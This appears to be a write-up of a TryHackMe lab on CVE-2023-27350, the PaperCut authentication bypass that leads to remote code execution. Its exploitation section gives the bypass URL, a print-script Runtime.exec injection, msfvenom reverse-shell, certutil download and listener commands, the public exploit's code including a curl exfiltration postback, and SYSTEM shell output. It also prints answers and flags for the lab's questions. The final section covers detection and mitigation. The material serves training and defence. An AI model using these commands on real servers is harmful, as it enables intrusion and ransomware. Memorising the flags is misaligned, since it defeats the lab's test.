CVE-2023-27350
#RCE #printers 
https://tryhackme.com/room/papercut

On 8 March 2023, a patch for [CVE-2023-27350](https://nvd.nist.gov/vuln/detail/CVE-2023-27350) was released. The CVE details an authentication bypass in the PaperCut NG/MF application, a web-based software used by enterprise organisations to manage their printers and printing processes. The vulnerability allows any threat actor to remotely gain admin access to the web application and abuse the legitimate scripting functionality in the application to achieve remote code execution as SYSTEM on the server.

The issue, however, was that in the subsequent months that followed, [active exploitation](https://www.zerodayinitiative.com/advisories/ZDI-23-233/) of this issue was seen in the wild. There has also been a [steady increase](https://news.sophos.com/en-us/2023/04/27/increased-exploitation-of-papercut-drawing-blood-around-the-internet/) in exploitation, including malware delivery with C2 frameworks such as CobaltStrike and even ransomware! The groups behind the active exploitation include prominent Advance Persistent Threats (APTs) such as the [Cl0p ransomware group](https://twitter.com/MsftSecIntel/status/1651346653901725696).

Exploitation has seen such a significant uptick because this is a zero-click exploit. It can be fully scripted for automated malware delivery if the target system is vulnerable. In this room, we will explain the vulnerability, show how it can be exploited, how it can be defended against, and the fundamental security principle that this issue raised again, that proper cleanup after an installation is vital!

- ` http://MACHINE_IP:9191 `

## paperCut

PaperCut is a popular print management software organizations use worldwide to manage printing and copying services. Within its suite of products, PaperCut offers two similar self-hosted options:

- **PaperCut NG -** their print management and control solution
- **PaperCut MF -** similar to NG but with extended copy and scan functionalities.

PaperCut has [announced](https://www.papercut.com/kb/Main/PO-1216-and-PO-1219) that unpatched MF and NG servers are being exploited in the wild, as they are susceptible to the authentication bypass vulnerability described below.

CVE-2023-27350

The Zero Day Initiative [ZDI-23-233](https://www.zerodayinitiative.com/advisories/ZDI-23-233/) details CVE-2023-27350 as a vulnerability allowing an unauthenticated, remote attacker to gain remote code execution and compromise the affected PaperCut application server. This CVE is also directly linked to CVE-2023-27351, which, by abusing the same vulnerability described below, allows an unauthenticated attacker to pull information (usernames, emails, and password hashes) from users stored within PaperCut.

This vulnerability is twofold and initially stems from an authentication bypass vulnerability. This allows an unauthenticated, remote attacker to bypass the login page and gain administrative access to the PaperCut console simply by requesting a URL that was originally used during the application’s installation flow.

This request then initiates the `SetupCompleted` class, which, as seen in the below code block, includes a call to the `performLogin()` Java method, passing in `Admin` as the `LoginType` argument.

```java
homePage.performLogin(setupData.getAdminUserName(), LoginType.Admin, false);
```

The application normally calls this function only after a user has become validated during the regular login flow. In this case, however, there is a [Session Puzzling](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/08-Testing_for_Session_Puzzling) flaw within the `SetupCompleted` class, a logic vulnerability that occurs when session and authentication functions are used for multiple purposes. By exploiting this flaw, the application will mistakenly validate an administrator session for an unauthenticated user.

To learn more about authentication bypass vulnerabilities, check out the [Authentication Bypass](https://tryhackme.com/room/authenticationbypass) room!

This authentication bypass leads to remote code execution by abusing the administrator console's built-in “scripting” functionality. If exploited, an attacker can insert arbitrary JavaScript into the print template script. Turning off the sandboxing configuration option grants the printer scripts direct access to the Java runtime, allowing for the execution of arbitrary code. The code can be executed on demand by saving the script. Therefore, simply editing the script can allow for remote code execution.

To heighten the severity of this issue, the executed scripts run in the context of the _PrintCut_ service, which, in turn, executes as the fully privileged `NT AUTHORITY\SYSTEM` account on Windows installations (or the `root` account on Linux). Therefore, abusing this functionality gives a previously unauthenticated threat actor full privileges over the host!

### impact 

The severity of CVE-2023-27350 has been evident through multiple instances of active exploitation by threat actors who have used it to infiltrate target systems with malicious intent. Due to its simple nature, it is trivial for threat actors to automate the entire attack. Since releasing a public exploit PoC, threat researchers observed multiple groups target vulnerable servers globally, with a large percentage of those targeted in the educational sector. As seen in the below timeline, the groups behind the active exploitation include the prominent Cl0p ransomware group.

A search on [Shodan](https://shodan.io/) in April 2023 revealed around 1,700 _internet-exposed_ PaperCut servers. As mentioned earlier, PaperCut is a widely used software solution with over 100 million users from 70,000 organizations worldwide, which is a strong motivator for a wide range of threat actors.

In regards to payloads, Sophos has observed the abuse of many legitimate tools commonly used by IT staff, such as _AnyDesk_, _Atera_, _Synchro_, _TightVNC_, _NetSupport_, and _DWAgent_, across multiple campaigns. Moreover, attackers also continue to employ the use of Truebot (malware downloader), Buhtiransom (ransomware), Mirai (botnet) and coin miners on compromised systems.

The below graphic, simplified from data by [Sophos](https://news.sophos.com/en-us/2023/04/27/increased-exploitation-of-papercut-drawing-blood-around-the-internet/), offers an initial timeline of the most notable PaperCut-related events as they unfolded

![sophos infograph](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/b95e8aa1a6d07bc6eee8ba94c0a8a035.svg)

```
What is the name for the logic vulnerability that occurs when session and authentication functions are used for multiple purposes?

Session Puzzling

What is the name of the Java class containing the authentication bypass vulnerability?

SetupCompleted
```

## Exploiting 

Let’s take a look at what is required to exploit the vulnerability. We will exploit the authentication bypass and take it a step further by leveraging the scripting functionality to gain remote code execution!

### Bypassing Authentication

The vulnerability itself is incredibly trivial and something that is seen quite often. When an application is installed, the initial configuration allows the user to bypass the authentication step or authenticate with default credentials. This is why it is still a very popular attack to guess `admin:admin` (or any other equivalent) on any web application. If the default credentials have not been changed, this will grant you access. Here are some very well-known examples:

```
Apache Tomcat   tomcat: s3cr3t
Jenkins         jenkins : jenkins
Almost any Wifi router   admin: admin
```

This is such a popular attack that exploitation of this issue was how the [Marai botnet](https://www.malwarebytes.com/what-was-the-mirai-botnet) was created!

To combat this known attack vector, web applications typically avoid the implementation of default credentials. This is done by forcing the user to change the password on the first authentication attempt or by generating a random password. However, this then created the avenue for a new vulnerability, as seen with CVE-2023-27350. If the setup files are not properly removed, a threat actor can leverage this to ask the setup process to "restart" the initial authentication process and grant access.

```
# paperCut application
http://MACHINE_IP:9191

login page

# exploit vuln 
http://MACHINE_IP:9191/app?service=page/SetupCompleted

login
```

It is that simple. As mentioned before, the main issue stems from installation and setup files persisting in the application after the initial configuration. As the **SetupCompleted** page is responsible for creating your new session but expects you to already be authenticated, we can bypass authentication entirely by simply navigating to the page and pressing the **Login** button, which generates an active session token for us!

### Remote Code Execution

Gaining administrative access to a web application is already concerning, as it can allow a threat actor to read and alter sensitive information. However, it worsens since legitimate functionality can often be leveraged to perform remote code execution on the server.

The feature in question that can be leveraged in the PaperCut application for remote code execution is the **Script Manager** for printers. You can navigate to this section as follows:

```
1. click on printers
2. click on [Template printer]
3. click on Scripting tab
4. check the "Enable print script"

------------------------------------------
// Customize your print process with Print Scripting.  
// You don't have to be a programmer to use Print Scripting.  
// Use one of the many pre-written recipes
// already written for you, or write your own in 
// JavaScript using snippets and reference documentation.
//
function printJobHook(inputs, actions) {
  // your script here
}
------------------------------------------
```

attacker terminal
```
tcpdump -i ens5 icmp
```

```java
function printJobHook(inputs, actions) { 
	// your script here 
} 
java.lang.Runtime.getRuntime().exec('ping.exe 10.10.69.242');
```
hit apply
check terminal for pings

### attack

Now that we understand both the authentication bypass and the remote code execution, we can combine this to get a shell on the host. If you are unfamiliar with using tools such as **Metasploit**, it is recommended that you first complete [this](https://tryhackme.com/module/metasploit) module. For this step, we will use the publicly available exploit from [Horizon3AI](https://www.horizon3.ai/papercut-cve-2023-27350-deep-dive-and-indicators-of-compromise/), that can be downloaded from this [repo](https://github.com/horizon3ai/CVE-2023-27350/tree/main). Run 
```
# to download the exploit
git clone https://github.com/horizon3ai/CVE-2023-27350
```

msfvenom 
```
msfvenom -p windows/shell/reverse_tcp -f exe LHOST=10.10.69.242 LPORT=4444 -o shell.exe
```

python HTTP server
```
python3 -m http.server 8080
```

configure listener for new terminal window
```
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/shell/reverse_tcp; set LHOST 10.10.69.242; set LPORT 4444; exploit"
```

Now that we have everything configured, we are ready to go. We will execute two commands using the Python exploit. The first command will download our executable, and the second will execute it. In a new terminal window, we will use **Certutil** to download our shell:

```
python3 CVE-2023-27350.py -u http://10.10.69.251:9191 -c "certutil.exe -urlcache -f http://10.10.69.242:8080/shell.exe shell.exe"
```

You should see a download request in your Python HTTP Server. Next, we can use cmd to execute our shell:
```
python3 CVE-2023-27350.py -u http://10.10.69.251:9191 -c "cmd.exe /c shell.exe"
```

we're in!
```
Shell Banner:
Microsoft Windows [Version 10.0.17763.1821]
-----
C:\Program Files\PaperCut NG\server>

dir
Directory of C:\Program Files\PaperCut NG\server

02/14/2025  06:58 PM    <DIR>          .
02/14/2025  06:58 PM    <DIR>          ..
07/19/2023  01:47 PM    <DIR>          bin
07/19/2023  01:47 PM    <DIR>          custom
07/19/2023  01:50 PM    <DIR>          data
07/19/2023  01:47 PM    <DIR>          examples
07/19/2023  01:47 PM    <DIR>          lib
07/19/2023  01:47 PM    <DIR>          lib-ext
02/14/2025  06:33 PM    <DIR>          logs
07/19/2023  01:55 PM            10,665 server.properties
05/16/2019  04:14 AM            10,607 server.properties.template
07/19/2023  01:49 PM               107 server.uuid
02/14/2025  06:58 PM            73,802 shell.exe
05/16/2019  04:14 AM             1,141 site-server.properties.template
02/14/2025  06:35 PM    <DIR>          tmp
05/16/2019  04:14 AM               163 version.txt
               6 File(s)         96,485 bytes
              10 Dir(s)  12,668,915,712 bytes free

```

As the PaperCut service runs as **SYSTEM**, there isn’t even a need to perform privilege escalation! We now have the highest level of control over this server.

### understanding automated exploit 

The automated exploit script that we use performs the same steps as our manual exploitation. The key steps and the associated code are explained below.

**Performing the Authentication Bypass**

The first part of the script performs the authentication bypass by using the Python `requests` library to navigate to the vulnerable **SetupCompleted** page:

```python
def get_session_id(base_url): 
	s = requests.Session() 
	r = s.get(f'{base_url}/app?service=page/SetupCompleted', verify=False)
```

**Retrieving an Admin Session**

Once the page is loaded, the code performs a `POST` request to the specified target to recover an Admin session token (`JSESSIONID`):

```python
headers = {'Origin': f'{base_url}'} 
data = { 'service': 'direct/1/SetupCompleted/$Form', 'sp': 'S0', 'Form0': '$Hidden,analyticsEnabled,$Submit', '$Hidden': 'true', '$Submit': 'Login' } 
r = s.post(f'{base_url}/app', data=data, headers=headers, verify=False) 
if r.status_code == 200 and b'papercut' in r.content and 'JSESSIONID' in r.headers.get('Set-Cookie', ''):
```

**Navigating to the Printer Script Manager**

Using the active session, the exploit performs a series of HTTP `GET` requests to navigate to the printer's Script Manager. By default, the first printer in the list is selected:

```python
def execute(base_url, session, command): 
	print('[*] Prepparing to execute...') 
	postback = "java.lang.Runtime.getRuntime().exec('cmd.exe /C \"for /F \"usebackq delims=\" %A in (`whoami`) do curl http://10.0.40.83:8081/%A\"');" 
	headers = {'Origin': f'{base_url}'} 
	data = { 'service': 'page/PrinterList' } 
	r = session.get(f'{base_url}/app?service=page/PrinterList', 
	data=data, headers=headers, verify=False) 
	data = { 'service': 'direct/1/PrinterList/selectPrinter', 'sp': 'l1001' } 
	r = session.get(f'{base_url}/app?service=direct/1/PrinterList/selectPrinter&sp=l1001', data=data, headers=headers, verify=False) 
	data = { 'service': 'direct/1/PrinterDetails/printerOptionsTab.tab', 'sp': '4' } r = session.get(f'{base_url}/app', 
	data=data, headers=headers, verify=False)
```

**Embedding the Code Execution**

In order to execute the provided command, the exploit has to update and execute the script. This has to be done using a multi-part form submission, as shown below:

```python
data = { 'service': 'direct/1/PrinterDetails/$PrinterDetailsScript.$Form', 'sp': 'S0', 'Form0': 'printerId,enablePrintScript,scriptBody,$Submit,$Submit$0,$Submit$1', 'printerId': 'l1001', 'enablePrintScript': 'on', 'scriptBody': "function printJobHook(inputs, actions) {}\r\n" \ f"java.lang.Runtime.getRuntime().exec('{command}');", '$Submit$1': 'Apply', } r = session.post(f'{base_url}/app', data=data, headers=headers, verify=False)
```

**Verifying Exploitation**

The last step is verifying that the exploitation worked as expected. This is done by determining if the message **"Saved successfully"** is seen in the response:

```python
if r.status_code == 200 and 'Saved successfully' in r.text: print('[+] Executed successfully!') else: print('[-] Might not have a printer configured. Exploit manually by adding one.')
```

```
If the vulnerable host has a hostname of PRINT.TRYHACKME.LOC, what would be the URL that you could use to perform the authentication bypass?

http://print.tryhackme.loc:9191/app?service=page/SetupCompleted

What would be the one-liner added to the Script Manager to execute calc.exe?

What is the value of the flag stored in the Administrator's Desktop folder?

cd c:\Users\Administrator\Desktop
dir
flag.txt
more flag.txt

THM{PaperCuts.Can.Hurt.Even.Computers}

What text is the automated exploit searching for to tell it that the exploitation was successful?

```

## detection & mitigation 

Detection

Before diving into the detection and mitigations published online, let's investigate what application logging information we have that will provide us with information about the attack. Once you have completed the full exploit path, navigate to the **Logs** feature on the PaperCut application and select the **Application Log**. You will see the following:

```
Logs > Application Log
```
As you can see from the image, the attack is relatively noisy, just in the application logs alone. From these logs alone, we can see the IP from which the authentication as the admin user occurred, and the modification of the print script. Along with this, there are several key areas that defenders should focus their detection efforts on:
- Network traffic signatures
- System monitoring
- Server settings and log files

Network Traffic Signatures

As described earlier, to exploit CVE-2023-27350, an attacker needs to initially access the `/app?service=page/SetupCompleted` path of the PaperCut server, allowing them to bypass the authentication flow. As such, finding that a `GET` request was made to this page outside of any known installation or upgrade procedures on the PaperCut server clearly indicates suspicious activity.

Additionally, [PaperCut](https://www.papercut.com/kb/Main/PO-1216-and-PO-1219) has provided a list of known malicious domains associated with the PaperCut exploit in the wild. If contact with any of these domains is found in Domain Name System (DNS) or web proxy logs, it is considered another indicator of compromise, prompting investigation:

---

Additionally, the latest versions of PaperCut NG and PaperCut MF can be directly accessed [here](https://www.papercut.com/products/upgrade/).

If you are unable to patch immediately, there are several options you can perform to lock down network access and achieve partial mitigation:

- **Block all inbound traffic** from **external IPs** to the web management port (ports 9191 and 9192 by default). This will not mitigate the exploitation of the vulnerability if an attacker has managed to gain access to the local network and pivoted laterally.
- **Block all inbound traffic** to the web management portal **on the firewall to the server**. This method will prevent lateral movement and pivoting from internal hosts but also prevent management of the PaperCut service from any other location besides the server itself.

Detection Scenario

It's time to investigate a real-world scenario using the above mentioned methods! Ensure to click **Start Machine** at the top of this task, and the website will initialize in a split-screen view. **Note:** It may take a few minutes to become reachable. You can refresh the embedded browser if needed by clicking on its name, beside the "Machine Information". In case the VM is not visible, use the blue **Show Split View** button at the top of the page.

Server Settings and Log Files

If the PaperCut server is configured to log in **debug mode**, it may be possible to identify suspicious activity by searching for lines containing `SetupCompleted` at a time not correlating with any known server installation or upgrade. Additionally, server logs can be found in `[app-path]/server/logs/*.*`, with `server.log` typically being the most recent log file. Finding log entries related to the following may be indicators of compromise and warrant further investigation:

- User "admin" updated the config key "print.script.sandboxed"
- User "admin" updated the config key "device.script.sandboxed"
- User "admin" updated the config key "print-and-device.script.enabled"
- Admin user "admin" modified the print script on the printer
- User/Group Sync settings changed by "admin"

```
Based on the application logs in the first image, what is the name of the printer for which the "print script" has been updated?
[Template printer]

What is the executable name of the PaperCut process on Windows?
pc-app.exe

What is the flag you receive after detecting the indicators of compromise within Inktrail's network?

/app?service=page/SetupCompleted
/app?service=page/PrinterDetails/printerOptionsTab

PID 8436  C:\Windows\System32\cmd.exe

"admin" logged into admin interface
"admin" updated the config key (x2)
"admin" modified the print script

# THM{PAPER.JAM.DETECTED}

```

